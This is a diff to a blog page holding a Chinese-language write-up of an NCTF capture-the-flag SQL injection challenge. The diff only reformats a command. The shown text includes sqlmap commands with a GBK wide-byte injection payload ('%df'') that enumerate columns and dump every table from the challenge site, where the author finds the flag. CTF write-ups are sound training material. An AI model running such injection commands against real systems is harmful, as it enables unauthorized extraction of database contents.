@@ -346,7 +346,9 @@ Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given i
 <p>列举表中字段：</p>
 <pre><code>sqlmap.py -u &quot;http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df&apos;&quot; --columns -T ctf
 </code></pre><p><img src="/2017/06/01/NCTF/SQLi3-columns-ctf.png" alt=""></p>
-<p>没找到什么有用的东西。直接跑出所有表中的内容：<br><code>sqlmap.py -u &quot;http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df&#39;&quot; --dump-all</code><br>在ctf4这张表里找到了flag。(在ctf2的表里还有个假flag…)    </p>
+<p>没找到什么有用的东西。直接跑出所有表中的内容：   </p>
+<pre><code>sqlmap.py -u &quot;http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df&apos;&quot; --dump-all
+</code></pre><p>在ctf4这张表里找到了flag。(在ctf2的表里还有个假flag…)    </p>
 <p><img src="/2017/06/01/NCTF/SQLi3-ctf4.png" alt=""></p>
 <h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1>]]></content>
       
